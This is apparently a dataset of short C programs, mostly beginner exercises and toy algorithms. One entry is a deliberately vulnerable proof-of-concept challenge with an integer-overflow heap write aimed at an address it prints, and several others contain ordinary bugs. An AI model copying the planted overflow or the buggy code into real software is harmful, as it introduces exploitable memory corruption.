    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\n#include <time.h>\n\n\nint main(int argc, char** argv)\n{\n    double ki, km, kn, kf, ps;\n    int T;\n    const double MSS = 1;\n    const double RWS = 1024;\n    double thresh;\n    double CW;\n    int N;\n    FILE *fp;\n    ki = atof(argv[2]);\n    km = atof(argv[4]);\n    kn = atof(argv[6]);\n    kf = atof(argv[8]);\n    ps = atof(argv[10]);\n    T = atof(argv[12]);\n    fp = fopen(argv[14],\"w\");\n    int u=0;\n    fprintf(fp,\"0 %f\\n\",CW);\n    CW = ki * MSS * 1.0;\n    thresh = T/2;\n    int sent=0;\n    int segment_count=0;\n    while(sent<T)\n    {\n        N = (int)ceil(CW/MSS);\n        segment_count=0;\n        while(segment_count<N)\n        {\n            double R = (1.0*(rand()%(0x7fffffff)))/(0x7fffffff);\n            if(R<ps)\n            {\n                segment_count=0;\n                thresh = CW/2;\n                CW = (((1)>(kf*CW))?(1):(kf*CW));\n            }\n            else\n            {\n                if (CW < thresh) {\n                    CW = (((CW + km*MSS)<(RWS))?(CW + km*MSS):(RWS));\n                    sent++;\n                }\n                else {\n                    CW = (((CW + kn*MSS*MSS/CW)<(RWS))?(CW + kn*MSS*MSS/CW):(RWS));\n                    sent++;\n                }\n                segment_count++;\n            }\n            fprintf(fp,\"%d %f\\n\",u+1,CW);\n            u++;\n        }\n    }\n    fclose(fp);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main() {\n  int arr[10], i;\n  for (i = 0; i < 10; i++)\n    scanf(\"%d\", &arr[i]);\n  for (i = 0; i < 10; i++) {\n    if (!(arr[i] % 2))\n      printf(\"%d \", arr[i]);\n  }\n  for (i = 0; i < 10; i++) {\n    if (arr[i] % 2)\n      printf(\"%d \", arr[i]);\n  }\n  printf(\"\\n\");\n  return 0;\n}",
    "#include<unistd.h>\n#include<stdlib.h>\n#include<stdio.h>\nint main()\n{\n unsigned int *tab, n, k, v, PoC = 0;\n printf(\"PoC at %p\\n\",&PoC);\n printf(\"n: \");\n scanf(\"%u\",&n);\n tab = malloc(n*sizeof(int));\n if(tab == 0)\n  return 1;\n printf(\"Success! (%p)\\n\",tab);\n printf(\"tab[k]=v; k,v: \");\n scanf(\"%u%u\",&k,&v);\n if(k<n)\n  tab[k] = v;\n else\n  puts(\"k>=n - FAIL\");\n if(PoC == 1337)\n  puts(\"Victory!\");\n}",
    "#include <stdio.h>\nint main() {\n    unsigned char a, b;\n    unsigned int sum;\n    scanf(\"%hhu %hhu\", &a, &b);\n    for(unsigned char x = a; x <= b; x++)\n        sum += x * x;\n    printf(\"%u\", sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint add(int a, int b);\nint inc(int z);\nint main(){\n  int x;\n  int y = 5;\n  int z;\n  int a = 8;\n  int b = 7;\n  x = 4;\n  z = 5;\n  b = 2;\n  int i = add(x,y);\n  if(i>=b && y!=a){\n    b = b + x*x;\n    x = x*i;\n    z = z + x;\n    a = a + x;\n  }\n  int j;\n  for(j=0; j<=a; j++){\n    z = z+j;\n  }\n#pragma start_slicing_criterion\n  y = x + b;\n  printf(\"%d %d %d\", y, x, b);\n#pragma end_slicing_criterion\n  y = add(x,y);\n  return 0;\n}\nint add(int a, int b){\n  int c;\n  c = a + b;\n  return c;\n}\nint inc(int z){\n  z = add(z,1);\n  return z;\n}",
    "#include <unistd.h>\nint main()\n{\n write(1, \"z\", 1);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int n1, n2, teste1 = 0, teste2 = 0, vad1 = 0;\n    scanf(\"%d %d\", &n1, &n2);\n    int vet[n1], rep[n2];\n    for(int i = 0; i < n1; i++){\n        vet[i] = i+1;\n    }\n    for(int i = 0; i < n2; i++){\n        scanf(\"%d\", &rep[i]);\n    }\n    for(int i = 0; i < n1; i++){\n        for(int j = 0; j < n2; j++){\n            if(vet[i] == rep[j]){\n                vet[i] = 0;\n                rep[j] = 0;\n                break;\n            }\n        }\n    }\n    for(int i = 0; i < n2; i++){\n        if(rep[i] > 0){\n            teste1++;\n        }\n    }\n    if(teste1 != 0){\n        for(int i = 0; i < n2; i++){\n            if(rep[i] > 0){\n                vad1++;\n                if(vad1 != teste1){\n                    printf(\"%d \", rep[i]);\n                }\n                else printf(\"%d\\n\", rep[i]);\n            }\n        }\n    }\n    else printf(\"N\\n\");\n    for(int i = 0; i < n1; i++){\n        if(vet[i] > 0){\n            teste2++;\n        }\n    }\n    if(teste2 != 0){\n        for(int i = 0; i < n1; i++){\n            if(vet[i] > 0){\n                printf(\"%d \", vet[i]);\n            }\n        }\n    }\n    else printf(\"N\\n\");\n    return 0;\n}",
    "#include<stdio.h>\nint addDigits(int num) {\n  int newSum = 0;\n  while (num >= 10) {\n    newSum = 0;\n    while (num) {\n      newSum += num%10;\n      num /= 10;\n    }\n    num = newSum;\n  }\n  return num;\n}\nint main(void) {\n  printf(\"%d\\n\", addDigits(341));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(){\n  int mypid, myppid;\n  printf(\"This is the main() program\\n\");\n  printf(\"I would like to know the PID and PIDD's information\\n\");\n  mypid = getpid();\n  myppid = getppid();\n  printf(\"The process ID is %d\\n\", mypid);\n  printf(\"The parent process is %d\\n\", myppid);\n  return 0;\n}",
    "#include <stdio.h>\n\n\nint main()\n{\n    int c, i, j, nchar, maxfreq, lower;\n    nchar = maxfreq = 0;\n    int charfreq[128];\n    for (i = 0; i < 128; ++i)\n        charfreq[i] = 0;\n    while ((c = getchar()) != (-1)) {\n        ++nchar;\n        ++charfreq[c];\n    }\n    if (1) {\n        for (i = 'A'; i <= 'Z'; ++i) {\n            lower = i+('a'-'A');\n            charfreq[lower] = charfreq[lower]+charfreq[i];\n            charfreq[i] = 0;\n        }\n    }\n    if(nchar == 0)\n        printf(\"no chars found.\\n\");\n    else\n    {\n        for (i = 0; i <= 128; ++i) {\n            if (charfreq[i] > maxfreq)\n                maxfreq = charfreq[i];\n        }\n        printf(\"\\nCharacter Frequencies (case insensitive)\\n\");\n        printf(\"========================================\\n\\n\");\n        for (i = maxfreq; i >= 1; --i) {\n            printf(\"%3d| \", i);\n            for (j = 0; j < 128; ++j)\n                if(charfreq[j] > 0)\n                    if (charfreq[j] >= i)\n                        printf (\"# \");\n                    else\n                        printf (\"  \");\n            putchar('\\n');\n        }\n        printf(\"   +\");\n        for (i = 0; i < 128; ++i)\n            if(charfreq[i] > 0)\n                printf(\"--\");\n        printf(\"\\n    \");\n        for (i = 0; i < 128; ++i)\n            if (charfreq[i] > 0)\n                if (i == '\\b')\n                    printf(\"\\\\b\");\n                else if (i == '\\t')\n                    printf(\"\\\\t\");\n                else if (i == '\\n')\n                    printf(\"\\\\n\");\n                else if (i == ' ')\n                    printf(\"  \");\n                else\n                    printf(\" %c\", i);\n        printf(\"\\n\\n\");\n    }\n}",
    "#include<stdio.h>\nint func(void);\nint main(void)\n{\n printf(\"%d\\n\",func());\n return 0;\n}\nint func(void)\n{\n int num,s=0;\n for(num=1; num<=25; num++)\n {\n  if(num%2!=0)\n        s+=num*num;\n }\n return s;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid part1(const char *filename)\n{\n    FILE *fp;\n    char *line = ((void*)0);\n    size_t len = 0;\n    ssize_t nread;\n    int result = 0;\n    int num = 0;\n    int horizontal = 0;\n    int depth = 0;\n    char direction[20];\n    fp = fopen(filename, \"r\");\n    if (fp == ((void*)0))\n    {\n        perror(\"Error while openging the file.\\n\");\n        exit(-1);\n    }\n    while ((nread = getline(&line, &len, fp)) != -1)\n    {\n        sscanf(line, \"%s %d\", direction, &num);\n        switch(direction[0])\n        {\n            case 'f':\n                horizontal += num;\n                break;\n            case 'd':\n                depth += num;\n                break;\n            case 'u':\n                depth -= num;\n                break;\n            default:\n                printf(\"Error in reading file\");\n                exit(1);\n        }\n    }\n    printf(\"horizontal %d and depth %d\\n\\n\", horizontal, depth);\n    printf(\"Result part 1 = %d \\n\\n\", (horizontal * depth));\n    fclose(fp);\n}\nvoid part2(const char *filename)\n{\n    FILE *fp;\n    char *line = ((void*)0);\n    size_t len = 0;\n    ssize_t nread;\n    int aim = 0;\n    int num = 0;\n    int horizontal = 0;\n    int depth = 0;\n    char direction[20];\n    fp = fopen(filename, \"r\");\n    if (fp == ((void*)0))\n    {\n        perror(\"Error while openging the file.\\n\");\n        exit(-1);\n    }\n    while ((nread = getline(&line, &len, fp)) != -1)\n    {\n        sscanf(line, \"%s %d\", direction, &num);\n        switch(direction[0])\n        {\n            case 'f':\n                horizontal += num;\n                depth += (aim * num);\n                break;\n            case 'd':\n                aim += num;\n                break;\n            case 'u':\n                aim -= num;\n                break;\n            default:\n                printf(\"Error in reading file\");\n                exit(1);\n        }\n    }\n    printf(\"horizontal %d and depth %d and aim %d\\n\\n\", horizontal, depth, aim);\n    printf(\"Result part 2 = %d \\n\\n\", (horizontal * depth));\n    fclose(fp);\n}\nint main(void)\n{\n    char filename[25] = \"input.txt\";\n    part1(filename);\n    part2(filename);\n    return 0;\n}",
    "#include <stdio.h>\nint loop(void) {\n  const int MAX = 10000000;\n  int a = 1, b = 1, c = 1;\n  while (1) {\n    if (a*a*a == b*b*b + c*c*c) { return 1; }\n    a++;\n    if (a > MAX) {\n      a = 1;\n      b++;\n    }\n    if (b > MAX) {\n      b = 1;\n      c++;\n    }\n    if (c > MAX) {\n      c = 1;\n    }\n  }\n  return 0;\n}\nint main(void) {\n  loop();\n  printf(\"boom!\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nvoid array_print(int* array, size_t size)\n{\n for (int i = 0; i < size; ++i) {\n  printf(\"%i \", array[i]);\n }\n printf(\"\\n\");\n}\nvoid array_sort(int* array, size_t size)\n{\n for (int h = 0; h < size; ++h) {\n  for (int i = 1; i < size - h; ++i) {\n   if (array[i-1] > array[i]) {\n    int tmp = array[i-1];\n    array[i-1] = array[i];\n    array[i] = tmp;\n   }\n  }\n }\n}\nint main()\n{\n int array[10] = {2, 3, 1, 4, 6, 10, -4, 9, 0, -100};\n array_sort(array, 10);\n array_print(array, 10);\n return 0;\n}",
    "#include <stdio.h>\nint rec(int base, int exponent){\n    if(exponent <= 0)\n        return 1;\n    else\n        return base * rec(base, exponent - 1);\n}\nint main(){\n    int base, exponent;\n    scanf(\"%d%d\", &base, &exponent);\n    printf(\"%d\", rec(base, exponent));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\n#include <math.h>\nint valor_absoluto(int n) {\n  int i, x, valor;\n  for(i=0; i<n; i++) {\n    printf(\"\\nDigite um valor: \");\n    scanf(\"%d\", &x);\n    valor=abs(x);\n    printf(\"O valor absoluto de %d \u00e9 %d\", x, valor);\n  }\n}\nint main() {\n  setlocale(6, \"\");\n  int n;\n  printf(\"Informe quantos n\u00fameros voc\u00ea deseja calcular: \");\n  scanf(\"%d\", &n);\n  valor_absoluto(n);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint queue[20];\nint front = -1,\n    rear = -1;\nint isEmpty(){\n    return (front==-1 && rear==-1) ? 1 : 0;\n}\nint isFull(){\n    return (rear==20 -1) ? 1 : 0;\n}\nvoid push(int d){\n    if(isEmpty()){\n        front=rear=0;\n    }\n    else if(!isFull()){\n        rear++;\n    }\n    queue[rear] = d;\n}\nint pop(){\n    int x = -999;\n    if(isEmpty()){\n        return x;\n    }\n    else if(front==rear){\n        x = queue[front];\n        front = rear = -1;\n    }\n    else{\n        x = queue[front++];\n    }\n    return x;\n}\nint peek(){\n    return (isEmpty()) ? -999 : queue[front];\n}\nvoid display(){\n    if(isEmpty()){\n        printf(\"Empty!\\n\");\n        return;\n    }\n    printf(\"|front| \");\n    for(int i=front;i<=rear;i++)\n        printf(\"%d \",queue[i]);\n    printf(\"|rear|\\n\");\n}\nint main(int argc, char const *argv[])\n{\n    int ch;\n    do{\n        printf(\"Enter 1 -> display\\n\");\n        printf(\"Enter 2 -> push\\n\");\n        printf(\"Enter 3 -> pop\\n\");\n        printf(\"Enter 4 -> peek\\n\");\n        printf(\"Enter 5 -> isEmpty\\n\");\n        printf(\"Enter 6 -> isFull\\n\");\n        printf(\"Enter 0 -> exit\\n\");\n        printf(\"-> \");\n        scanf(\"%d\",&ch);\n        int k;\n        switch(ch){\n            case 1:display();break;\n            case 2:\n            printf(\"Enter element to insert: \");\n            scanf(\"%d\",&k);\n            push(k);\n            break;\n            case 3:\n            k=pop();\n            (k == -999)?printf(\"Empty!\\n\"):printf(\"popped: %d\\n\",k);\n            break;\n            case 4:\n            k=peek();\n            (k == -999)?printf(\"Empty!\\n\"):printf(\"front element: %d\\n\",k);\n            break;\n            case 5:\n            (isEmpty())?printf(\"Empty!\\n\"):printf(\"not empty\\n\");\n            break;\n            case 6:\n            (isFull())?printf(\"Full!\\n\"):printf(\"not full\\n\");\n            break;\n        }\n    }while(ch);\n    remove(argv[0]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    unsigned int a = 10;\n    unsigned int b = ~(4);\n    printf(\"%u\\n\",a+b);\n}",
    "#include<stdio.h>\nint main()\n{\n    char str[100];\n    fgets(str, 100, (stdin));\n    int i = 0, cont_vogal = 0;\n    while(str[i]){\n        if(str[i] == 'a' || str[i] == 'e' || str[i] == 'i' || str[i] == 'o' || str[i] == 'u')\n        {\n            cont_vogal++;\n        }\n        i++;\n    }\n    printf(\"%d\", cont_vogal);\n}",
    "#include <stdio.h>\nint main()\n{\nchar ch,a;\nint alph;\nscanf(\"%c\",&ch);\nalph='a'+'z';\na=alph-ch;\nprintf(\"\\n%c\",a);\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n    int etk_fiyati =100;\n    char \u00fcr\u00fcn_t\u00fcr;\n    int Tek_kdv = 18;\n    int kdv = 8;\n    printf(\"alinacak \u00fcr\u00fcn\u00fcn t\u00fcr\u00fcn\u00fc giriniz: \u00fcr\u00fcn teknolojik ise t de\u011fil ise i ye bas\u0131n\u0131z\");\n    scanf(\"%s\",&\u00fcr\u00fcn_t\u00fcr);\n    if(\u00fcr\u00fcn_t\u00fcr == 't')\n    {\n        double fiyat;\n        fiyat = etk_fiyati + Tek_kdv;\n        printf(\"%0.01lf\",fiyat);\n    }\n    if(\u00fcr\u00fcn_t\u00fcr == 'i')\n    {\n        double fiyat;\n        fiyat = etk_fiyati + kdv;\n        printf(\"%0.01lf\",fiyat);\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n   int yr;\n   printf(\"input yr:\");\n   scanf(\"%d\", &yr);\n      if(yr%400==0)\n        printf(\"leap year\");\n      else if(yr%100==0)\n        printf(\" not leap year\");\n      else if(yr%4==0)\n        printf(\"leap year\");\n      else\n        printf(\"not a leap yr\");\n    return 0;\n}",
    "#include <stdio.h>\nint reverse(int x){\n int reverse = 0;\n while (x){\n  reverse = reverse * 10 + (x % 10);\n  x /= 10;\n }\n return reverse;\n}\nvoid palindrome(int x){\n if (x == reverse(x))\n  printf(\"This number is a palindrome !\\n\");\n else\n  printf(\"This number is not a palindrome !\\n\");\n}\nint main() {\n int x;\n scanf(\"%d\", &x);\n palindrome(x);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n    printf(\"%s\", \"hello, world!\\n\");\n    exit(0);\n}",
    "#include <stdio.h>\nint main()\n{\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n, square;\n printf(\"TABLE OF SQUARE NUMBERS\\n\\n\");\n printf(\" n     Square from 1 to n\\n\");\n printf(\"---     ------------------\\n\");\n for(n = 1; n <= 10; ++n){\n  square = n * n;\n  printf(\"%2i             %i\\n\", n, square);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    return 0;\n}",
    "#include <stdio.h>\nint getFirstArray(int a[][20]);\nint main(void) {\n    int a[10][20] = {1, 2, 3, 4};\n    printf(\"%d \\n\", getFirstArray(a));\n    printf(\"%d \\n\", a[1][18]);\n    return 0;\n}\nint getFirstArray(int a[][20])\n{\n    a[1][18] = 44;\n    return a[0][0];\n}",
    "#include <stdio.h>\nvoid swap(int a, int *b){\n    int temp;\n    temp=a;\n    a=*b;\n    *b=temp;\n}\nint main(){\n    int a=10,b=20;\n    swap(a,&b);\n    printf(\"A=%d, B=%d\",a,b);\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n, x, ans = 0;\n scanf(\"%d\", &n);\n while (n--) {\n  scanf(\"%d\", &x);\n  if (x > 5)\n   ++ans;\n }\n printf(\"%d\", ans);\n return 0;\n}",
    "int main()\n{\n    for (;;)\n    {\n    }\n}",
    "#include <stdio.h>\nint main(void)\n{\n int x, y;\n printf(\"Number     Square\\n______     ______\\n\");\n for(x = 1; x < 11; x++)\n {\n  y = x*x;\n  printf(\"%3i          %3i\\n\", x, y);\n }\n return 0;\n}",
    "#include <stdlib.h>\n\nint *function (void) {\n    int array [123];\n    array [0] = 0;\n    return (array);\n}\nint main (void) {\n    int *array = function ();\n    return (array [0]);\n}",
    "#include<stdio.h>\n#include<math.h>\ndouble hipotenusa(double cateto1, double cateto2) {\n return sqrt( pow(cateto1,2) + pow(cateto2,2) );\n}\nint main ( void ) {\n printf(\"Triangulo 1: %.2f\\n\", hipotenusa(3.0, 4.0));\n printf(\"Triangulo 2: %.2f\\n\", hipotenusa(5.0, 12.0));\n printf(\"Triangulo 3: %.2f\\n\", hipotenusa(8.0, 15.0));\n}",
    "#include  <stdio.h>\nint main()\n{\n int a,b,c,d;\n scanf(\"%d %d %d\",&a,&b,&c);\n if(a>=b)d=a;\n else d=b;\n if(d<c)d=c;\n printf(\"%d\\n\",d);\nreturn 0;\n}",
    "#include <stdio.h>\nunsigned short create_short(unsigned char high_byte, unsigned char low_byte);\nint main() {\n  char ch1 = 254;\n  char ch2 = 255;\n  printf(\"%X\\n\", create_short(ch2, ch1));\n  return 0;\n}\nunsigned short create_short(unsigned char high_byte, unsigned char low_byte) {\n  return high_byte << 8 | low_byte;\n}",
    "#include <stdio.h>\nint main() {\n    int i = 1;\n    print:\n        printf(\"%d \", i);\n        i++;\n        if (i < 5) {\n            goto print;\n        }\n}",
    "#include<stdio.h>\nint main()\n{\n      int a,b,i=1,x,min;\n      printf(\"Enter Two Numbers To Find H.C.F\\n\");\n      printf(\"---------------------------\\n\");\n      printf(\"Enter First Number  : \");\n      scanf(\"%d\", &a);\n      printf(\"\\nEnter Second Number : \");\n      scanf(\"%d\",&b);\n      min=(a<b)?a:b;\n      while(i<=min)\n      {\n            if(a%i==0 && b%i==0)\n                  x=i;\n            i++;\n      }\n      printf(\"---------------------------\\n\");\n      printf(\"H.C.F of %d & %d : %d\",a,b,x);\n      return 0;\n}",
    "#include <stdio.h>\nint main() {\n    char ans[250] = {'\\0'}, *pt = ans, c, prev = '\\0';\n    int size = 0;\n    while ((c = (char) getc((stdin))) != '\\n') {\n        if (prev != c) {\n            ++size;\n            *pt = c;\n            ++pt;\n            prev = c;\n        }\n    }\n    for (int i = 0; i < size; ++i) {\n        printf(\"%c\", ans[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint a_length;\nvoid findBruteForce(int a[]);\nint main() {\n int a[] = {1,5,6,2,1,6,4,3,2,5,3};\n a_length = sizeof(a)/sizeof(int);\n findBruteForce(a);\n}\nvoid findBruteForce(int a[]){\n short * visited = calloc(a_length, sizeof(short));\n for( int i=0 ; i<a_length ; i++){\n  int x = a[i];\n  if(visited[i] == 0){\n   short isDuplicate = 0;\n   for (int j=i+1 ; j<a_length ; j++){\n    if(x == a[j]){\n     isDuplicate = 1;\n     visited[j] = 1;\n    }\n   }\n   if(isDuplicate == 0){\n    printf(\"Element appear only once in array - %d \\n\", x);\n   }\n  }\n }\n free(visited);\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint counter ();\nint main()\n{\n    char string[500] = {};\n    int tests;\n    printf(\"Enter number of tests: \");\n    scanf(\"%d\", &tests);\n    for (int i = 0; i <= tests; i++)\n    {\n        printf(\"Enter the string %d: \", i);\n        fgets(string, 500, (stdin));\n        printf(\"%d \\n\", counter(string));\n    }\n}\nint counter (char *string)\n{\n    int count = 0;\n    for(int i = 0; i < 500; i++)\n    {\n        if (string[i] == '1')\n            count++;\n    }\n    return count*(count + 1) /2 ;\n}",
    "#include <stdint.h>\nint main( void )\n{\n  static const uint64_t one = (uint64_t) 1;\n  if ((uint8_t) 1 == *((uint8_t *) &one))\n    return 0;\n  else\n    return 1;\n}",
    "#include <stdio.h>\n#include <string.h>\nint calculaResto(int soma)\n{\n    int digitoVerificador;\n    int resto = 0;\n    resto = soma % 11;\n    if(resto < 2)\n       digitoVerificador = 0;\n    else\n       digitoVerificador = 11 - resto;\n    return digitoVerificador;\n}\nint calculaDigitos(int digitoVerificador, int cpf[], int multiplicador[])\n{\n    int k = 8, i = 0, calc = 0;\n    if(digitoVerificador == 2)\n    {\n        k = 9;\n    }\n    calc = 0;\n    for(i=0; i<=k; i++)\n    {\n        calc += multiplicador[i] * cpf[i];\n    }\n    return calc;\n}\nint main()\n{\n int cpf[11];\n int multiplicadores1[]={10,9,8,7,6,5,4,3,2};\n int multiplicadores2[]={11,10,9,8,7,6,5,4,3,2};\n int i, soma, resto, digitoVerificador, digitoVerificador1, digitoVerificador2;\n printf(\"\\nEntre com os digitos de seu CPF, separados por ENTER: \");\n for(i=0; i<=10; i=i+1)\n {\n    scanf(\"%d\", &cpf[i]);\n }\n        soma = calculaDigitos(1, cpf, multiplicadores1);\n        digitoVerificador1 = calculaResto(soma);\n        soma = calculaDigitos(2, cpf, multiplicadores2);\n        digitoVerificador2 = calculaResto(soma);\n        if((cpf[9] == digitoVerificador1) && cpf[10] == digitoVerificador2)\n            printf(\"CPF Valido\");\n        else\n            printf(\"CPF Invalido\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int i;\n    long factorial[15];\n    factorial[0]=1;\n    for (i=1; i<15; i++){\n        factorial[i]= factorial[i-1] * i;\n        }\n    for(i=14; i>=0; i--){\n        printf(\"%d!% = %ld\\n\", i,factorial[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n float val1, val2;\n char o;\n printf(\"Enter the problem to be computed: \");\n scanf(\"%f %c %f\", &val1, &o, &val2);\n switch(o)\n {\n case '+':\n  printf(\"%.2f\\n\", val1 + val2);\n  break;\n case '-':\n  printf(\"%.2f\\n\", val1 - val2);\n  break;\n case '*':\n case 'x':\n  printf(\"%.2f\\n\", val1 * val2);\n  break;\n case '/':\n  if(val2 == 0)\n  printf(\"Not defined\\n\");\n  else\n  printf(\"%.2f\\n\", val1 / val2);\n  break;\n default:\n  printf(\"Please enter a valid operand and/or values\\n\");\n }\n}",
    "#include <stdio.h>\nint factorial(int r) {\n   int fact = 1;\n   while(r>1) {\n      fact = fact * r;\n      r--;\n   }\n   return fact;\n}\nint check(int n) {\n   int temp, rem, result = 0;\n   temp = n;\n   while(temp) {\n      rem = temp % 10;\n      result = result + factorial(rem);\n      temp = temp/10;\n   }\n   if (result == n)\n      return 1;\n   else\n      return 0;\n}\nint main(int argc, char const *argv[]) {\n   int n = 145;\n   if (check(n))\n      printf(\"Yes it is a strong number\\n\");\n   else\n      printf(\"no it is not a strong number\\n\");\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint sum(int *A, int N);\nint main()\n{\n    int N;\n    printf(\"Enter the number of elements: \");\n    scanf(\"%d\", &N);\n    int *A = (int *)malloc(N*sizeof(int));\n    for (int i = 0; i < N; ++i)\n    {\n        printf(\"Enter the element #%d: \", i+1);\n        scanf(\"%d\", &A[i]);\n    }\n    int ans = sum(A, N);\n    if (ans == 0)\n        printf(\"sum: zero %d\\n\", -ans);\n    else\n        printf(\"sum: non-zero %d\\n\", ans);\n    return 0;\n}\nint sum(int *A, int N)\n{\n    int ans = 0;\n    for (int i = 0; i < N; ++i)\n        ans += A[i];\n    return ans;\n}",
    "#include <stdio.h>\nint fib(int n)\n{\n    if (n == 0)\n        return 0;\n    else if (n == 1)\n        return 1;\n    return fib(n - 1) + fib(n - 2);\n}\nint main()\n{\n    printf(\"F(10) = %d\\n\", fib(10));\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int num;\n    if(num % 4 == 0 && num % 5 == 0){\n        printf(\"%i\\n\", num);\n    }\n    else{\n        printf(\"Nao eh divisivel por 4 e por 5!\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n printf(\"Hello 1205!\\n\");\n return 0;\n}",
    "#include <stdio.h>\nvoid exibeOnzeTracos(void);\nvoid paralelogramoTracos(void);\nvoid exibeOnzeTracos(void){\n int i;\n for(i=1;i<=11;i++){\n printf(\"-\");\n }\n}\nvoid paralelogramoTracos(void){\n int i,j;\n for(i=1;i<=3;i++){\n  exibeOnzeTracos();\n  printf(\"\\n\");\n  for(j=0;j<=i;j++){\n   printf(\" \");\n  }\n }\n printf(\"\\n\");\n}\nint main(){\n paralelogramoTracos();\n paralelogramoTracos();\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int numero;\n    numero = 1;\n    while (numero <= 100){\n        if (numero % 2 == 0){\n            printf(\"%d\\n\", numero);\n        }\n        numero++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    float inc,tax;\n    printf(\"Enter the amount of taxable income: \");\n    scanf(\"%f\",&inc);\n    if(inc<=750)\n        printf(\"The tax due is $%.2f\\n\",inc*1/100);\n    else if(inc<=2250)\n        printf(\"The tax due is $%.2f\\n\",7.5+(inc-750)*2/100);\n    else if(inc<=3750)\n        printf(\"The tax due is $%.2f\\n\",37.5+(inc-2250)*3/100);\n    else if(inc<=5250)\n        printf(\"The tax due is $%.2f\\n\",82.5+(inc-3750)*4/100);\n    else if(inc<=7000)\n        printf(\"The tax due is $%.2f\\n\",142.5+(inc-5250)*5/100);\n    else\n        printf(\"The tax due is $%.2f\\n\",230+(inc-7000)*6/100);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main(void)\n{\n    const double kmhtomps = 1000.0/3600;\n    double hours, minutes, way, consumption, totaltime;\n    printf(\"Gefahrene Stunden: \");\n    scanf(\"%lf\", &hours);\n    printf(\"Gefahrene Minuten: \");\n    scanf(\"%lf\", &minutes);\n    totaltime = hours + minutes / 60;\n    printf(\"Gefahrene Kilometer: \");\n    scanf(\"%lf\", &way);\n    printf(\"Gebrauchte Liter: \");\n    scanf(\"%lf\", &consumption);\n    printf(\"   Durchschnittl. Geschwindigkeit: %.2lf km/h (%.2lf m/s)\\n\", way/totaltime, way/totaltime*kmhtomps);\n    printf(\"   Durchschnittl. Benzinverbrauch: %.2lf l/100 km\", consumption / way * 100);\n    fflush((stdin));\n    getchar();\n    return 0;\n}",
    "#include <stddef.h>\n#include <sys/types.h>\n#include <sys/socket.h>\nint main() {\n  (void)getsockopt (1, 1, 1, ((void*)0), (size_t *)((void*)0));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint num, tempNum;\nint rev = 0;\nchar number[12];\nint main(int argc, char *argv[])\n{\n printf(\"Please type in a positive integer: \");\n do\n {\n  scanf(\"%d\", &num);\n  if (num < 0)\n  {\n      printf(\"The number entered in not a positive integer.\\n\");\n      printf(\"Please enter a positive integer: \");\n      getchar();\n  }\n } while (num < 0);\n tempNum = num;\n while (tempNum != 0)\n {\n  int rem = tempNum % 10;\n  rev = (rev * 10) + rem;\n  tempNum /= 10;\n }\n printf(\"You entered: %d\\n\", num);\n printf(\"This number in reverse is: %d\\n\", rev);\n    return 0;\n}",
    "#include <stdio.h>\nvoid print_help() {\n  printf(\"This program prints a friendly greeting.\\n\");\n  printf(\"When prompted, you can type in a name \\n\");\n  printf(\"and hit the return key. Max length is 24.\\n\");\n}\nint main() {\n  char name[25];\n  do {\n    print_help();\n    printf(\"Please enter a name: \");\n    scanf(\"%s\", name);\n  } while (name[0] == 'h' && name[1] == '\\0');\n  printf(\"Hello, %s!\\n\", name);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\nint main (int argc, char *argv[]){\n    if(!(argc > 1)){\n        printf(\"wunzip: file1 [file2 ...]\\n\");\n        return 1;\n    }\n    int buff[1];\n    for(int i = 1; i < argc; i++){\n        FILE *fp = fopen(argv[i], \"r\");\n        while(1){\n            size_t return_code = fread(buff, sizeof(int), 1, fp);\n            if(return_code == 0){\n                break;\n            }\n            int times_to_print = buff[0];\n            fread(buff, sizeof(char), 1, fp);\n            for(int j = 0; j < times_to_print; j++){\n                printf(\"%c\", buff[0]);\n            }\n        }\n        fclose(fp);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(int argc,char *argv[]){\n if(argc == 1)\n  return 0;\n for(int i=1;i<argc;i++){\n  if(argv[i][0]>=97&&argv[i][0]<=127){\n   argv[i][0] = argv[i][0] -32;\n  }\n }\n for(int i=1;i<argc;i++){\n  printf(\"%s \",argv[i]);\n }\n}",
